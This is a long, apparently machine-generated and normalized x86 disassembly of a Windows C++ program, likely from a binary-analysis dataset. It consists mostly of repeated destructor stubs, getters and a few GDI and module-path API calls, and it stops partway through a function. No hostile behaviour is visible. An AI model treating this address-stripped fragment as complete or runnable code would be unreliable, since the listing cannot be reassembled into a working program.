je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4024b0
mov eax r--data
retn
sub_4027f0
push esi
mov esi ecx
call sub_44f0ac
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_402810
mov eax r--data
retn
sub_402930
push esi
mov esi ecx
call sub_402950
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4029f0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_402ae0
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
push eax
mov eax [ ecx + 0x8 ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call sub_4209c9
retn 0x8
mov eax [ ecx + 0x4 ]
sub_402b80
push esi
mov esi ecx
call sub_402ba0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_402c80
mov eax r--data
retn
sub_404100
push esi
mov esi ecx
call sub_403270
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4041e0
mov eax r--data
retn
sub_4049d0
mov eax r--data
retn
sub_404b00
push esi
mov esi ecx
call sub_404b20
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_404bd0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_404d60
push esi
mov esi ecx
call sub_404d80
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_404e40
mov eax r--data
retn
sub_405de0
push esi
mov esi ecx
call sub_405300
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_405e00
mov eax r--data
retn
sub_406090
mov eax r--data
retn
sub_406190
push esi
mov esi ecx
call sub_4061b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_406240
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_406270
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_4063c0
push esi
mov esi ecx
call sub_4063e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4064b0
mov eax r--data
retn
sub_407610
push esi
mov esi ecx
call sub_4069f0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4076c0
mov eax r--data
retn
sub_407950
mov eax r--data
retn
sub_407a70
push esi
mov esi ecx
call sub_407a90
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_407b30
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_407ca0
push esi
mov esi ecx
call sub_407cc0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_407d80
mov eax r--data
retn
sub_408d20
push esi
mov esi ecx
call sub_408240
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_408dc0
mov eax r--data
retn
sub_409050
mov eax r--data
retn
sub_409150
push esi
mov esi ecx
call sub_409170
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_409200
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_4093e0
push esi
mov esi ecx
call sub_409400
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_409690
mov eax r--data
retn
sub_40a440
push esi
mov esi ecx
call sub_44f046
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40a460
mov eax r--data
retn
sub_40a580
push esi
mov esi ecx
call sub_4026e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40a5a0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_40a7c0
push esi
mov esi ecx
call sub_40a7e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40a990
mov eax r--data
retn
sub_40b280
mov eax r--data
retn
sub_40b340
push esi
mov esi ecx
call sub_404340
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40b360
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_40b510
push esi
mov esi ecx
call sub_40b590
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40b710
mov eax r--data
retn
sub_40bef0
mov eax r--data
retn
sub_40bfa0
push esi
mov esi ecx
call sub_40b530
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40bfc0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_40c0f0
push esi
mov esi ecx
call sub_40c160
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40c2b0
mov eax r--data
retn
sub_40c9b0
mov eax r--data
retn
sub_40ca40
push esi
mov esi ecx
call sub_40c110
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40ca60
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_40cbf0
push esi
mov esi ecx
call sub_40cc70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40cd60
mov eax r--data
retn
sub_40d5b0
mov eax r--data
retn
sub_40d660
push esi
mov esi ecx
call sub_40cc10
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40d680
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_40d780
push esi
mov esi ecx
call sub_40d7a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40d870
mov eax r--data
retn
sub_40ea70
push esi
mov esi ecx
call sub_40dd90
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40eb20
mov eax r--data
retn
sub_40ed10
mov eax r--data
retn
sub_40ee30
push esi
mov esi ecx
call sub_40ee50
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40eef0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_40f0e0
push esi
mov esi ecx
call sub_40f100
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40f1e0
mov eax r--data
retn
j_sub_43e191
jmp sub_43e191
sub_40f5c0
push esi
mov esi ecx
call sub_44f153
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40f640
mov eax r--data
retn
sub_40f650
mov eax r--data
retn
sub_40f6c0
push esi
mov esi ecx
call sub_40f6e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_40f7b0
mov eax [ esp + 0x4 ]
push eax
call sub_44f9cb
neg eax
sbb eax eax
neg eax
retn 0x4
j_sub_40f7e0
jmp sub_40f7e0
sub_40f7e0
push esi
push 0x0
push 0x1
mov esi ecx
push rw-data
call sub_4496b7
cmp eax 0x2
je r-xdata
pop esi
retn
mov ecx esi
call sub_44fde8
sub_410660
retn 0x4
sub_411630
call sub_45357b
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x4 ]
mov eax [ eax + 0xc0 ]
mov edx [ ecx ]
push eax
call [ edx ]
retn 0x4
sub_412350
mov eax [ esp + 0x4 ]
push eax
call sub_441eb2
pop ecx
retn 0x4
sub_4124c0
push esi
mov esi ecx
call sub_40fb20
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4125a0
mov eax r--data
retn
sub_4130f0
mov eax r--data
retn
sub_4131d0
push esi
mov esi ecx
call sub_404720
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4131f0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_413340
push esi
mov esi ecx
call sub_410590
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_413430
mov eax r--data
retn
sub_414590
push esi
mov esi ecx
call sub_413980
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_414620
mov eax r--data
retn
sub_414630
call sub_43e113
mov eax 0x1
retn
sub_4146c0
mov eax r--data
retn
sub_4147c0
push esi
mov esi ecx
call sub_413360
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4147e0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_4148d0
mov eax r--data
retn
sub_4148e0
push esi
mov esi ecx
push 0x0
call sub_453cfa
mov [ esi ] r--data
mov [ esi + 0xc0 ] 0x0
mov eax esi
pop esi
retn
sub_414900
push esi
mov esi ecx
call j_sub_45412b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
j_sub_45412b
jmp sub_45412b
sub_414930
call sub_414940
jmp sub_414950
sub_414940
mov ecx rw-data
jmp sub_4148e0
sub_414950
push sub_414960
call sub_42d719
pop ecx
retn
sub_414960
mov ecx rw-data
jmp j_sub_45412b
sub_414c30
push esi
push 0x0
mov esi ecx
push 0x64
call sub_43ddd5
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_414c50
push esi
mov esi ecx
call j_sub_43da87#3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
j_sub_43da87#3
jmp sub_43da87
sub_414c80
mov eax r--data
retn
sub_414d50
mov eax r--data
retn
sub_414d60
mov eax r--data
retn
sub_414d70
push esi
mov esi ecx
call sub_445509
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_414d90
push esi
mov esi ecx
call sub_414db0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_414db0
mov [ ecx ] r--data
jmp sub_445563
sub_414dc0
call sub_446162
neg eax
sbb eax eax
neg eax
retn
sub_414dd0
mov eax [ ecx + 0x44 ]
retn
sub_414de0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x44 ] eax
retn 0x4
sub_414e50
mov eax r--data
retn
sub_414e60
mov eax r--data
retn
sub_414e70
push esi
mov esi ecx
call sub_4465f9
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_414e90
push esi
mov esi ecx
call sub_414eb0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_414eb0
mov [ ecx ] r--data
jmp sub_446609
sub_414ec0
mov eax [ esp + 0x4 ]
push eax
call sub_44665c
retn 0x4
sub_414ed0
mov eax [ esp + 0x4 ]
push eax
call sub_459940
retn 0x4
sub_414ee0
retn 0x8
sub_415100
retn
sub_415110
push esi
mov esi ecx
call sub_415130
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_415170
push esi
mov esi ecx
call sub_415190
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4152f0
push esi
mov esi ecx
call sub_410eb0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_415450
mov eax r--data
retn
sub_415ea0
push esi
mov esi ecx
call sub_415ec0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_415f60
mov eax r--data
retn
sub_415f70
push esi
mov esi ecx
push 0x1
call sub_440b18
mov ecx esi
call sub_43e178
pop esi
retn
sub_4160e0
push esi
mov esi ecx
call sub_4108e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4161b0
mov eax r--data
retn
sub_416f90
push esi
mov esi ecx
call sub_410bd0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_417020
mov eax r--data
retn
sub_417760
mov eax r--data
retn
sub_4178b0
push esi
mov esi ecx
call sub_415310
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4178d0
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_417b60
push esi
mov esi ecx
call sub_411ac0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_417c30
mov eax r--data
retn
sub_418440
push esi
mov esi ecx
call sub_411d10
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_418460
mov eax r--data
retn
sub_418d30
push esi
mov esi ecx
call sub_40ff80
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_418de0
mov eax r--data
retn
sub_4191d0
mov eax [ esp + 0x8 ]
mov [ eax ] 0x0
retn 0x8
sub_41caf0
push esi
mov esi ecx
call sub_41a1f0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_41d000
mov eax r--data
retn
sub_41e700
mov eax r--data
retn
sub_41ee40
push esi
mov esi ecx
call sub_410040
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_41ee60
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_41f6f0
push esi
mov esi ecx
call sub_411510
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_41f7e0
mov eax r--data
retn
sub_41ff90
mov eax r--data
retn
sub_420040
push esi
mov esi ecx
call sub_40f3a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_420060
push ecx
push esi
mov esi [ esp + 0xc ]
push rw-data
mov ecx esi
mov [ esp + 0x8 ] 0x0
call sub_4421b6
mov eax esi
pop esi
pop ecx
retn 0x4
sub_4200f0
call sub_420100
jmp sub_420110
sub_420100
mov ecx rw-data
jmp sub_420130
sub_420110
push sub_420120
call sub_42d719
pop ecx
retn
sub_420120
mov ecx rw-data
jmp sub_420190
sub_420130
push esi
mov esi ecx
push 0x104
lea eax [ esi + 0x104 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov eax esi
pop esi
retn
sub_420190
retn
sub_420530
mov eax ecx
mov [ eax ] 0x1
mov [ eax + 0x10c ] 0x1
mov [ eax + 0x31c ] 0x0
retn
sub_420630
call sub_420640
jmp sub_420650
sub_420640
mov ecx rw-data
jmp sub_420700
sub_420650
push sub_420660
call sub_42d719
pop ecx
retn
sub_420660
mov ecx rw-data
jmp sub_420190
sub_4206f0
xor eax eax
retn
sub_420700
mov eax ecx
retn
sub_420724
mov eax [ ecx ]
jmp [ eax + 0xc4 ]
sub_420960
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push eax
call sub_43e7b3
retn
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
sub_420977
call sub_45357b
mov ecx [ eax + 0x4 ]
jmp sub_441bda
sub_420984
push esi
mov esi ecx
call sub_4209a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4209a0
mov eax sub_4631dc
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4477b8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_420a7a
push esi
mov esi ecx
call sub_420a96
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_420d7d
push esi
mov esi ecx
call sub_420d99
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_421052
mov ecx [ ebp - 0x14 ]
call sub_442f87
mov eax r-xdata
retn
sub_42108b
push 0x0
push [ esp + 0x8 ]
push ecx
call sub_42109a
retn 0x4
sub_42109a
movsx eax [ esp + 0x8 ]
test eax eax
jl r-xdata
xor eax eax
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
cmp eax 0x64
jne r-xdata
retn 0xc
sub_421514
retn 0x4
sub_4216d3
push 0xf
call sub_4556cc
xor edi edi
push edi
push edi
call sub_42dca7
mov ecx [ ebp + 0x8 ]
call sub_442f87
mov eax r-xdata
retn
sub_421707
push esi
mov esi ecx
call sub_421723
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_42176f
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
j_sub_442148
jmp sub_442148
sub_421c46
retn
sub_422003
push esi
mov esi ecx
cmp [ esi + 0x30 ] 0x0
jle r-xdata
pop esi
retn 0x8
push [ esp + 0x8 ]
call sub_423bc3
push [ esp + 0xc ]
mov ecx esi
push eax
call sub_422026
sub_4222d4
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push r--data
call sub_4421b6
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_4222f0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push rw-data
call sub_4421b6
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_422fe7
or [ ecx + 0xa0 ] 0xffffffff
xor eax eax
mov [ ecx + 0xc8 ] eax
mov [ ecx + 0xc4 ] eax
mov [ ecx + 0x98 ] eax
mov [ ecx + 0xe4 ] eax
mov [ ecx + 0x9c ] eax
retn
sub_423c0e
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx + 0xf4 ]
mov ecx [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ esp + 0x4 ]
mov ecx [ ecx + 0x3c ]
shl eax 0x4
lea eax [ ecx + eax + 0x4 ]
jmp r-xdata
retn 0x8
sub_423c35
mov eax [ ecx + 0xec ]
mov ecx [ esp + 0x4 ]
mov al [ eax + ecx ]
retn 0x4
sub_423c45
mov eax [ ecx + 0xec ]
mov ecx [ esp + 0x4 ]
add eax ecx
mov cl [ esp + 0x8 ]
or [ eax ] cl
retn 0x8
sub_423c5a
push [ ecx + 0x14 ]
push 0x0
push [ ecx + 0xec ]
call sub_42dc30
add esp 0xc
retn
sub_423c81
mov eax [ ecx + 0xec ]
mov ecx [ esp + 0x4 ]
add eax ecx
or [ eax ] 0x1
retn 0x4
sub_423c93
mov eax [ ecx + 0xec ]
mov ecx [ esp + 0x4 ]
add eax ecx
and [ eax ] 0xfe
retn 0x4
sub_423cef
mov eax [ ecx + 0xf0 ]
mov ecx [ esp + 0x4 ]
add eax ecx
or [ eax ] 0x2
retn 0x4
sub_423d01
mov eax [ ecx + 0xf0 ]
mov ecx [ esp + 0x4 ]
add eax ecx
and [ eax ] 0xfd
retn 0x4
sub_4241eb
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
sub_424228
mov eax [ esp + 0x4 ]
add eax eax
retn 0x4
sub_42433b
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
cmp eax 0xfffffffe
je r-xdata
retn 0xc
cmp [ esp + 0xc ] 0x64
je r-xdata
mov edx [ esp + 0x8 ]
add eax edx
mov [ ecx ] eax
sub_424383
push [ ecx + 0x58 ]
push ecx
push [ esp + 0xc ]
call sub_4209c9
retn 0x4
sub_425355
mov ecx [ ecx ]
xor eax eax
cmp ecx [ esp + 0x4 ]
setne al
retn 0x4
sub_425597
mov ecx [ ecx ]
xor eax eax
cmp ecx [ esp + 0x4 ]
sete al
retn 0x4
sub_4256dd
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ eax + 0xc4 ] ecx
retn
sub_4257eb
call sub_4257f5
jmp sub_4257f6
sub_4257f5
retn
sub_4257f6
push sub_425802
call sub_42d719
pop ecx
retn
sub_425802
mov ecx rw-data
jmp r-xdata
jmp sub_45527e
sub_425811
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
call sub_45357b
mov [ eax + 0x1038 ] esi
pop esi
retn
push sub_4260e4
mov ecx rw-data
call sub_455223
mov esi eax
sub_425912
push [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_426a04
retn 0x10
sub_4260e4
push 0x4
call sub_454d77
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_4260f9
push esi
mov esi ecx
call sub_421c46
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_426114
push esi
mov esi ecx
call sub_426130
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_426130
mov eax sub_463bb4
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x10
call sub_442148
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_42615c
push [ esp + 0x4 ]
add ecx 0xc
call sub_4422d1
retn 0x4
sub_42616b
push esi
mov esi ecx
call sub_426187
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_426187
mov eax sub_463cc0
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4477b8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4261b0
mov eax sub_463cd4
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4477b8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
j_sub_43da87#2
jmp sub_43da87
sub_4261de
mov eax [ ecx ]
jmp [ eax + 0xe0 ]
sub_4261e6
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ eax + 0xc0 ] ecx
retn
sub_4261f2
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_442f7b
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_42621c
push esi
mov esi ecx
call sub_426238
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_426238
mov [ ecx ] r--data
retn
sub_42623f
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_442f7b
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_426269
push esi
mov esi ecx
call sub_426285
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_426285
mov [ ecx ] r--data
retn
sub_42628c
push esi
mov esi ecx
call sub_4261b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4262a8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_4262bc
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_4262cc
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_426345
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_426391
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_4263ad
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_442f7b
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_4263d7
push esi
mov esi ecx
call sub_4263f3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4263f3
mov [ ecx ] r--data
retn
sub_4263fa
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_442f7b
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_426424
push esi
mov esi ecx
call sub_426440
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_426440
mov [ ecx ] r--data
retn
sub_426447
push esi
mov esi ecx
call sub_426463
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4264ab
push esi
mov esi ecx
call sub_4264c7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4264c7
mov eax sub_463fc8
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
